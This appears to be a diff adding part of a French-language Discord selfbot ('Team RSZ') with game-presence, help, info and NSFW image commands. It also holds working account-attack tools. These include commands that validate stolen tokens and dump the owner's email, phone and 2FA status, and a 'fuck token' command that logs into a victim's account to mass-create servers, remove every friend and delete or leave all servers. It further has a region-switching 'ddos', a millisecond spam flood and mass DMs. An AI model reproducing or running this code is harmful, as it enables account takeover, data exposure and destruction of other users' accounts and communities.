+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande apex legends executé")
+                  console.log("╟─────────────────────────────────╢") 
+                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur Apex Legends**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "csgo")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "csgo")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Counter Strike")
+              .setUrl('https://www.twitch.tv/hml_cp0')
+              .setType("PLAYING")
+              .setApplicationId("603405368940429315")
+              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande csgo")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur csgo**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "among us")){
+      let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "amongus")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Among us")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("PLAYING")
+              .setApplicationId("603405368940429315")
+              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande Among Us executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur among us**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "fortnite")){
+      let argument = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "fortnite")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Fortnite")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("PLAYING")
+              .setApplicationId("603405368940429315")
+              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Comande Fortnite executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur fortnite**`);
+                })
+              }
+    if(message.content.startsWith(prefix + "rocket league")){
+      let argument = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+      rpcGenerator.getRpcImage("603405368940429315", "rocket_league")
+      .then(image => {
+          let presence = new rpcGenerator.Rpc()
+              .setName("Rocket League")
+              .setUrl('https://www.twitch.tv/codezero_two_')
+              .setType("PLAYING")
+              .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
+              .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
+              .setApplicationId("603405368940429315")
+              .setDetails('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+              .setAssetsLargeImage(image.id)
+              .setAssetsLargeText("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+              .setState(argument)
+              .setStartTimestamp(Date.now())
+    
+              .setParty({
+                  id: uuid()
+                  })
+                  client.user.setPresence(presence.toDiscord()).catch(console.error);
+                  console.log("╟ Commande rocket league executé")
+                  console.log("╟─────────────────────────────────╢")
+                  message.edit(`:white_check_mark: **Tu joues à ${argument} sur rocket league**`);
+                })
+              }
+    if(msg.content === prefix + "channels list"){
+      if (!msg.guild) {
+        return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
+    }
+    if(!message.member.hasPermission('EMBED_LINKS')) return message.edit(`:x: **permission insuffisante (embed_links)** ${salons.map(c => c.name)}`);
+    const salons = message.guild.channels;
+    var channel = new Discord.RichEmbed()
+    .setFooter("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+    .setColor(color)
+    .addField("liste des salons:", salons.map(c => c.name))
+    for (pas=0; pas< 10; pas++) {
+      channel.setColor(color)
+    message.edit(channel).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+    }
+    console.log('Commande channels list executé'.yellow)
+  }
+if(msg.content === prefix + "roles list"){
+if (!msg.guild) {
+        return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
+    }
+    if(!message.member.hasPermission('EMBED_LINKS')) return message.edit(`:x: **permission insuffisante (embed_links)** ${role.map(r => r.name)}`);
+      const role = message.guild.roles;
+      var roles = new Discord.RichEmbed()
+      .setFooter("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+      .setColor(color)
+      .addField("liste des roles:", role.map(r => r.name))
+      message.edit(roles).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+      console.log("╟ Commande role liste executé")
+      console.log("╟─────────────────────────────────╢")
+    }
+    if (message.content === prefix + "cmd") {
+      message.edit(cmd).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+      console.log("╟ Commande cmd executé")
+      console.log("╟─────────────────────────────────╢")
+    }
+    if (message.content === prefix + "help") {
+      message.edit(help).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+      console.log("╟ Commande help executé")
+      console.log("╟─────────────────────────────────╢")
+  }
+if (message.content === prefix + "help raid") {
+  message.edit(help_raid).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+  console.log("╟ Commande help raid executé")
+  console.log("╟─────────────────────────────────╢")
+}
+if (message.content === prefix + "help hack") {
+  message.edit(help_hack).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+  console.log("╟ Commande help hack executé")
+  console.log("╟─────────────────────────────────╢")
+}
+if (message.content === prefix + "help statut") {
+  message.channel.send(help_statut2);
+  message.edit(help_statut).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+  console.log("╟ Commande help statut executé")
+  console.log("╟─────────────────────────────────╢")
+}
+  if (message.content === prefix + "help fun") {
+    message.edit(help_fun).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+    console.log("╟ Commande help fun executé")
+    console.log("╟─────────────────────────────────╢")
+}
+if (message.content === prefix + "help moderation") {
+  message.edit(help_moderation).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+  console.log("╟ Commande help moderation executé")
+  console.log("╟─────────────────────────────────╢")
+}
+if (message.content === prefix + "help nsfw") {
+  message.edit(help_nsfw).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+  console.log("╟ Commande nsfw executé")
+  console.log("╟─────────────────────────────────╢")
+}
+
+if (message.content === prefix + "help gen") {
+  message.edit(gen).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+  console.log("╟ Commande generateur executé")
+  console.log("╟─────────────────────────────────╢")
+}
+
+if (message.content === prefix + "help utile") {
+
+  message.edit(help_info).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+  console.log("╟ Commande help utile")
+  console.log("╟─────────────────────────────────╢")
+};
+
+if(message.content.startsWith(prefix + 'avatar' || prefix + "pp")){
+  const user = message.mentions.users.first() || message.author;
+  const avatarEmbed = new Discord.RichEmbed()
+      .setAuthor(user.username)
+      .setImage(user.avatarURL)
+      .setColor(color)
+      .setFooter(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉`)
+        message.edit(avatarEmbed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+        console.log("╟ Commande avatar executé")
+        console.log("╟─────────────────────────────────╢")
+};
+
+  if (message.content === prefix + 'change hypesquad brilliance') {
+
+            
+                      let url = `https://discordapp.com/api/v6/hypesquad/online`;
+
+                      request(url, {
+                        method: 'POST',
+                        headers: {
+                          authorization: token,
+                          'content-type': 'application/json',
+                          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
+                        },
+                        body: JSON.stringify({ 'house_id' : 2 })
+                      });
+                      msg.edit(`:white_check_mark: **Vous avez rejoint la hypesquad 'brilliance'**`)
+                      console.log("╟ Commande change hypesquad executé")
+                      console.log("╟─────────────────────────────────╢")
+                    }
+                    if (message.content === prefix + 'change hypesquad ballance') {
+
+            
+                      let url = `https://discordapp.com/api/v6/hypesquad/online`;
+
+                      request(url, {
+                        method: 'POST',
+                        headers: {
+                          authorization: token,
+                          'content-type': 'application/json',
+                          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
+                        },
+                        body: JSON.stringify({ 'house_id' : 3 })
+                      });
+                      msg.edit(`:white_check_mark: **Vous avez rejoint la hypesquad 'ballance'**`)
+                      console.log("╟ Commande change hypesquad executé")
+                      console.log("╟─────────────────────────────────╢")
+                    }
+
+                    if (message.content === prefix + 'change hypesquad bravery') {
+
+                      let url = `https://discordapp.com/api/v6/hypesquad/online`;
+
+                      request(url, {
+                        method: 'POST',
+                        headers: {
+                          authorization: token,
+                          'content-type': 'application/json',
+                          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
+                        },
+                        body: JSON.stringify({ 'house_id' : 1 })
+                      });
+                      msg.edit(`:white_check_mark: **Vous avez rejoint la hypesquad 'bravery'**`)
+                      console.log("╟ Commande change hypesquad executé ")
+                      console.log("╟─────────────────────────────────╢")
+                    }
+if (message.content.startsWith(prefix + 'check token')) {
+  let argument = args.splice(2).join(" ");
+
+        let url = "https://discordapp.com/api/v6/users/@me";
+        request(
+            url, {
+                method: "GET",
+                headers: {
+                    authorization: argument
+                }
+            },
+            function(error, response, body) {
+                if (response.statusCode === 200) {
+                    var validtoken = new Discord.RichEmbed()
+                        .setTitle(`Token info`)
+                        .setDescription(`Le token: ${argument} \n**est 100% valide** :white_check_mark:`)
+                        .setColor(color)
+                        .setTimestamp()
+                        .setFooter(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉`, message.author.avatarURL)
+                    message.edit(validtoken).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+                } else {
+                    var invalidtoken = new Discord.RichEmbed()
+                        .setTitle(`Token info`)
+                        .setDescription(`Le token ${argument} \nn'est pas valide :x:`)
+                        .setColor(color)
+                        .setTimestamp()
+                        .setFooter(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉`, message.author.avatarURL)
+                    message.edit(invalidtoken).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+                    console.log("╟ Commande check token executé")
+                    console.log("╟─────────────────────────────────╢")
+                }
+            })
+}
+
+if(message.content == prefix + "ddos voc"){
+  if (!msg.guild) {
+    return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
+}
+if(!message.member.hasPermission("ADMINISTRATOR")){
+  message.channel.send(':x: **Il vous faut les permissions administrateur pour executer cette commande**')
+  return;
+}
+  let index = 0;
+const arrayDesRegions = [
+  "japan", "hongkong", "russia",
+  "india", "brazil", "sydney"
+];
+
+
+setInterval(() => {
+  message.guild.setRegion(arrayDesRegions[index]);
+  index++;
+  if (index == arrayDesRegions.length) index = 0;
+}, 1000);
+msg.edit('**Commande ddos vocal activé**')
+console.log("╟ Commande ddos voc executé")
+console.log("╟─────────────────────────────────╢")
+}
+if(message.content == prefix + "ddos-stop"){
+  if (!msg.guild) {
+    return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
+}
+clearInterval();
+msg.edit('**Commande ddos stopé**')
+console.log("╟ Commande stop ddos voc executé")
+console.log("╟─────────────────────────────────╢")
+}
+if(message.content.startsWith(prefix + "spam")){
+  let spam = args.splice(1).join(" ");
+  msg.edit('**Patiente...**')
+  setInterval(() => {
+    msg.channel.send(spam).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+  }, 1);
+  console.log("╟ Commande spam executé")
+  console.log("╟─────────────────────────────────╢")
+  }
+  if (message.content.startsWith(prefix + "virus")) {
+    if (message.author.id == client.user.id) {
+        let args = message.content.split(' ').slice(1);
+        let virusname = args.join(' ');
+        if (!virusname) {
+            return message.edit("𝐕𝐞𝐮𝐢𝐥𝐥𝐞𝐳 𝐦𝐞𝐭𝐭𝐫𝐞 𝐥𝐞 𝐧𝐨𝐦 𝐝𝐮 𝐡𝐚𝐜𝐤");
+        }
+        message.edit({
+            embed: new Discord.RichEmbed()
+                .setTitle('𝐋𝐨𝐚𝐝𝐢𝐧𝐠 ' + virusname + "...")
+                .setColor(color)
+        }).then(function(m) {
+
+            setTimeout(function() {
+                m.edit({
+                    embed: new Discord.RichEmbed()
+                        .setTitle('[' + virusname + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓ ] 𝟏%')
+                        .setColor(color)
+                })
+            }, 1000)
+
+            setTimeout(function() {
+                m.edit({
+                    embed: new Discord.RichEmbed()
+                        .setTitle('[' + virusname + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓] 𝟐𝟓%')
+                        .setColor(color)
+                })
+            }, 2000)
+
+            setTimeout(function() {
+                m.edit({
+                    embed: new Discord.RichEmbed()
+                        .setTitle('[' + virusname + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓] 𝟓𝟎%')
+                        .setColor(color)
+                })
+            }, 3000)
+
+            setTimeout(function() {
+                m.edit({
+                    embed: new Discord.RichEmbed()
+                        .setTitle('[' + virusname + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓▓▓▓▓] 𝟕𝟓%')
+                        .setColor(color)
+                })
+            }, 4000)
+
+            setTimeout(function() {
+                m.edit({
+                    embed: new Discord.RichEmbed()
+                        .setTitle('[' + virusname + ']: 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐕𝐢𝐫𝐮𝐬 [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 𝟏𝟎𝟎%')
+                        .setColor(color)
+                })
+            }, 5000)
+
+            setTimeout(function() {
+                m.edit({
+                    embed: new Discord.RichEmbed()
+                        .setTitle('[' + virusname + ']: 𝐕𝐢𝐫𝐮𝐬 𝐥𝐚𝐧𝐜𝐞́')
+                        .setColor(color)
+                })
+            }, 6000)
+
+            setTimeout(function() {
+                m.delete();
+            }, 10000)
+        });
+    }
+}
+  
+if (message.content.startsWith(prefix + 'info token')) {
+      let argument = args.splice(2).join(" ");
+      let url = "https://discordapp.com/api/v6/users/@me";
+      request(
+        url, {
+            method: "GET",
+            headers: {
+                authorization: argument
+            }
+        },
+        function(error, response, body) {
+            if (response.statusCode === 200) {
+            body = JSON.parse(body)
+              var id = body["id"];
+              var username = body["username"];
+              var avatar = body["avatar"];
+              var discriminator = body["discriminator"];
+              var mfa_enabled = body["mfa_enabled"];
+              var phone = body["phone"];
+              var locale = body["locale"];
+              let publicflag = body["public_flags"];
+              let flags = body["flags"];
+              let email = body["email"];
+              let verified = body["verified"];
+              let nsfwallowed = body["nsfw_allowed"];
+              
+              var tyty = "";
+              tyty += "\nUser: " + username + "#" + discriminator;
+              tyty += "\nId: " + id;
+              tyty+= "\nEmail: " + email;
+              tyty += "\nNuméro de telephone: " + phone;
+              tyty += "\nAvatar: " + avatar;
+              tyty += "\nLangue: " + locale;
+              tyty += "\nA2f activé?: " + mfa_enabled;
+              tyty+= "\nCompte vérifié?: " + verified;
+              tyty+= "\nNsfw activé?: " + nsfwallowed;
+              tyty+= "\nFlags: " + flags;
+              tyty+= "\nPublic Flags: " + publicflag;
+                      var embed = new Discord.RichEmbed()
+                        .setTitle("**Commande Token Info**")
+                        .setDescription(tyty)
+                        .setColor(color)
+                        .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉');
+    
+                        return message.edit(embed).then(console.log("╟ Commande token info executé"))
+                                                        console.log("╟─────────────────────────────────╢")
+            } else {
+                var invalidtoken = new Discord.RichEmbed()
+                    .setTitle(`Token info`)
+                    .setDescription(`Le token ${argument} \nn'est pas valide :x:`)
+                    .setColor(color)
+                    .setTimestamp()
+                    .setFooter(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉`, message.author.avatarURL)
+
+                message.edit(invalidtoken).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+          
+            }
+        })
+};
+
+if (message.content.startsWith(prefix + 'fuck token')) {
+  let fucked = new Discord.Client();
+        let argument = args.splice(2).join(" ");
+        let url = "https://discordapp.com/api/v6/users/@me";
+        request(
+            url, {
+                method: "GET",
+                headers: {
+                    authorization: argument
+                }
+            },
+            function(error, response, body) {
+                if (response.statusCode === 200) {
+                  fucked.on("ready", function(){
+                    for (pas=0; pas< 100; pas++) {
+                    fucked.user.createGuild("Rip ;)", "london")
+                    }
+                  });
+                  for (pas=0; pas< 20; pas++) {
+                  fetch("https://discord.com/api/v8/users/@me/settings", {
+                    "headers": {
+                      "authorization": argument,
+                      "content-type": "application/json",
+                    },
+                    "body": "{\"theme\":\"light\"}",
+                    "method": "PATCH"
+                  });
+                 
+                 fetch("https://discord.com/api/v8/users/@me/settings", {
+                    "headers": {
+                      "authorization": argument,
+                      "content-type": "application/json",
+                    },
+                    "body": "{\"theme\":\"dark\"}",
+                    "method": "PATCH"
+                  });
+                  };
+                  fucked.on('ready', function(){
+                    fucked.user.friends.forEach(amis => {
+                     fucked.user.removeFriend(amis).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+                    });
+                    fucked.guilds.forEach(serveurs => {
+                      if(serveurs.ownerID === fucked.user.id){
+                        serveurs.delete().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+                      }else
+                        serveurs.leave().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+                    });
+                    message.edit(':white_check_mark: **Token fuck en cours...**')
+                    })
+                    
+                  fucked.login(argument);
+                } else {
+                    var invalidtoken = new Discord.RichEmbed()
+                        .setTitle(`Token info`)
+                        .setDescription(`Le token ${argument} \nn'est pas valide :x:`)
+                        .setColor(color)
+                        .setTimestamp()
+                        .setFooter(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉`, message.author.avatarURL)
+
+                    message.edit(invalidtoken).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+                }
+            })
+            console.log("╟ Commande fuck token executé")
+            console.log("╟─────────────────────────────────╢")
+      };
+    if (message.content.startsWith(prefix + "8ball")) {
+        let args =  message.content.split(" ").splice(1).join(' ')
+        var eightball = [
+          "oui!",
+          "non...",
+          "peut etre?",
+          "probablement",
+          "je ne pense pas.",
+          "jamais!",
+          "tu peux essayer...",
+      ]
+        if (args[1] != null)message.edit(args + "\nla reponse est: " + eightball[Math.floor(Math.random() * eightball.length)]).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+        else message.edit("Quelle est ta question? :rolling_eyes: (essayeplutot:" + prefix + " 8ball [question])");
+        console.log("╟ Commande 8ball executé")
+  console.log("╟─────────────────────────────────╢")
+    };
+       if(message.content.startsWith(prefix + "mp friend")){
+        
+      if (!args) {
+        throw 'Vous devez mettre quelque chose à dire !';
+    }
+        let saymsg = args.splice(2).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉\n";
+        client.user.friends.forEach(friends => {
+          friends.send(saymsg).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+        });
+        console.log("╟ Commande mp friend executé")
+        console.log("╟─────────────────────────────────╢")
+  };
+  
+if(message.content.startsWith(prefix + "say")){
+if (!args) {
+        throw 'Vous devez mettre quelque chose à dire !';
+    }
+      
+        let saymsg = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+        let say = new Discord.RichEmbed()
+        .setTitle('**Commande Say**')
+        .setDescription(saymsg)
+        .setTimestamp()
+        .setFooter(`𝚃𝚎𝚊𝚖 𝚁𝚂𝚉-Selbot`, `${client.user.avatarURL}`)
+        .setColor(color)
+        for (pas=0; pas< 10; pas++) {
+          say.setColor(color)
+    message.edit(say).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+    }
+    console.log("╟ Commande say executé")
+    console.log("╟─────────────────────────────────╢")
+  };
+    if(message.content.startsWith(prefix + "user info")){
+        if (!mentionuser) { return msg.edit(":x: **Utilisateur inconnu!**"), mentionuser = message.author;}
+        var userGuild = (message.guild.member(mentionuser));
+        var game = mentionuser.presence.game;
+        var gameName = game ? game.name : "Nothing";
+        var userRoles = (!userGuild ? null : userGuild.roles.array());
+        if (userGuild) {
+            userRoles.shift();
+            for (var i = 0; i < userRoles.length; ++i) {
+                userRoles[i] = userRoles[i].name;
+            }
+            userRoles = userRoles.join(", ");
+        };
+        var status = {
+            dnd: "Ne pas déranger",
+            offline: "Hors Ligne/Invisible",
+            online: "En ligne",
+            idle: "Innactif"
+        };
+        const embed = new Discord.RichEmbed()
+        .setAuthor(`${mentionuser.username}#${mentionuser.discriminator} | ${mentionuser.id}`, mentionuser.displayAvatarURL)
+          .setFooter("E")
+           .setThumbnail(mentionuser.displayAvatarURL)
+           .setColor(color)
+           .addField("Created", `${mentionuser.createdAt.toString().substr(0, 15)},\n${checkDays(mentionuser.createdAt)}`, true)
+           .addField("Joined", `${userGuild.joinedAt.toString().substr(0, 15)},\n${checkDays(userGuild.joinedAt)}`, true)
+           .addField("Status", status[mentionuser.presence.status], true)
+           .addField("Playing", gameName, true)
+           .addField("Nickname", userGuild.nickname ? userGuild.nickname : "None", true)
+           .addField("Avatar URL", `[Click here!](${mentionuser.displayAvatarURL})`, true)
+           .addField("Roles", userRoles ? userRoles : "None")
+
+        msg.edit(embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+        console.log("╟Commande user info executé")
+  console.log("╟─────────────────────────────────╢")  
+    };
+   if(message.content === prefix + "serveur info"){
+    if (!msg.guild) {
+        return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
+    }
+
+    const millis = new Date().getTime() - msg.guild.createdAt.getTime();
+    const days = millis / 1000 / 60 / 60 / 24;
+    const verificationLevels = ['None', 'Low', 'Medium', 'Insane', 'Extreme'];
+
+    let embed = new Discord.RichEmbed()
+    .setTitle('**Serveur info**')
+    .addField('Name:', `${msg.guild.name}`)
+    .addField('Created On:',  `${message.guild.createdAt.toString().substr(0, 15)},\n${checkDays(message.guild.createdAt)}`, true)
+    .addField('Default Channel:', `${msg.guild.defaultChanne}`)
+    .addField('Region:', `${msg.guild.region}`)
+    .addField('Member Count', `${msg.guild.members.filter(m => m.presence.status !== 'offline').size} / ${msg.guild.memberCount}`)
+    .addField('Owner:', `${message.guild.owner.user.username}`)
+    .addField('Text Channels', `${msg.guild.channels.filter(m => m.type === 'text').size}`)
+    .addField('Voice Channels', `${msg.guild.channels.filter(m => m.type === 'voice').size}`)
+    .addField('Verification Level', `${verificationLevels[msg.guild.verificationLevel]}`)
+    .addField('Roles:', `${msg.guild.roles.size}`)
+    .addField('Guild ID:', `${msg.guild.id}`)
+    .setColor(color)
+
+    if (msg.guild.iconURL != null) {
+        embed.setThumbnail(`${msg.guild.iconURL}`);
+    }
+    msg.edit(embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+    console.log("╟ Commande user info executé")
+  console.log("╟─────────────────────────────────╢")
+};
+    if(message.content === prefix + 'stats'){
+        let embed = new Discord.RichEmbed();
+        embed.setTimestamp()
+        .setColor(color)
+        .setTitle('**Selfbot Statistics**')
+        .addField('Mem Usage:', `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB`)
+        .addField('Servers:', `${client.guilds.size}`)
+        .addField('Channels:', `${client.channels.size}`)
+        .addField('Users:', `${client.guilds.map(guild => guild.memberCount)}`)
+        .addField('Servers:', `${client.guilds.size}`)
+        .addField('Servers:', `${client.guilds.size}`)
+        .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉', `${client.user.avatarURL}`)
+        if(client.user.premium > 0){
+          embed.addField("• Nitro", `oui`)
+        }else
+        embed.addField("• Nitro", `non`)
+        message.edit(embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+        console.log("╟ Commande stats executé")
+  console.log("╟─────────────────────────────────╢")
+    }
+     
+if(message.content.startsWith(prefix + "ass")){
+    superagent.get('https://nekobot.xyz/api/image')
+      .query({ type: 'ass'})
+      .end((err, response) => {
+      var ass = new Discord.RichEmbed()
+      .setColor(color)
+      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+      .setTimestamp()
+      .setImage(response.body.message)
+      .setColor(color)
+        msg.edit(ass).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+      });
+      console.log("╟ Commande ass executé")
+      console.log("╟─────────────────────────────────╢")
+  }
+  if(message.content.startsWith(prefix + "4k")){
+    superagent.get('https://nekobot.xyz/api/image')
+      .query({ type: '4k'})
+      .end((err, response) => {
+      var nk = new Discord.RichEmbed()
+      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+      .setTimestamp()
+      .setImage(response.body.message)
+      .setColor(color)
+
+        msg.edit(nk).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+        console.log("╟ Commande 4k executé")
+  console.log("╟─────────────────────────────────╢")
+      });
+    }
+  if(message.content.startsWith(prefix + "nsfw-gif")){
+    var gif1 = new Discord.RichEmbed()
+    superagent.get('')
+      .query({ type: 'pgif'})
+      .end((err, response) => {
+      var gif1 = new Discord.RichEmbed()
+      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+      .setTimestamp()
+      .setImage(response.body.message)
+      .setColor(color)
+        msg.edit(gif1).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+        console.log("╟ Commande nsfw fif executé")
+  console.log("╟─────────────────────────────────╢")
+  });
+  }
+  if(message.content.startsWith(prefix + "hentai")){
+    var hentai = new Discord.RichEmbed()
+    superagent.get('https://nekobot.xyz/api/image')
+      .query({ type: 'hentai_anal'})
+      .end((err, response) => {
+       var hentai = new Discord.RichEmbed()
+      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+      .setTimestamp()
+      .setImage(response.body.message)
+      .setColor(color)
+        msg.edit(hentai).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+        console.log("╟ Commande hentai executé")
+  console.log("╟─────────────────────────────────╢")
+  });
+  }
+  if(message.content.startsWith(prefix + "pussy")){
+    superagent.get('https://nekobot.xyz/api/image')
+      .query({ type: 'pussy'})
+      .end((err, response) => {
+       var pussy = new Discord.RichEmbed()
+      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+      .setTimestamp()
+      .setImage(response.body.message)
+      .setColor(color)
+        msg.edit(pussy).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+        console.log("╟ Commande pussy executé")
+  console.log("╟─────────────────────────────────╢")
+  });
+  }
+  
+  if(message.content.startsWith(prefix + "thigh")){
+    superagent.get('https://nekobot.xyz/api/image')
+      .query({ type: 'thigh'})
+      .end((err, response) => {
+        var thigh = new Discord.RichEmbed()
+      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+      .setTimestamp()
+      .setImage(response.body.message)
+      .setColor(color)
+        msg.edit(thigh).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+        console.log("╟ Commande thigh executé")
+  console.log("╟─────────────────────────────────╢")
+  });
+  }
+  if(message.content.startsWith(prefix + "anal")){
+    superagent.get('https://nekobot.xyz/api/image')
+      .query({ type: 'anal'})
+      .end((err, response) => {
+        var anal = new Discord.RichEmbed()
+    .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+    .setTimestamp()
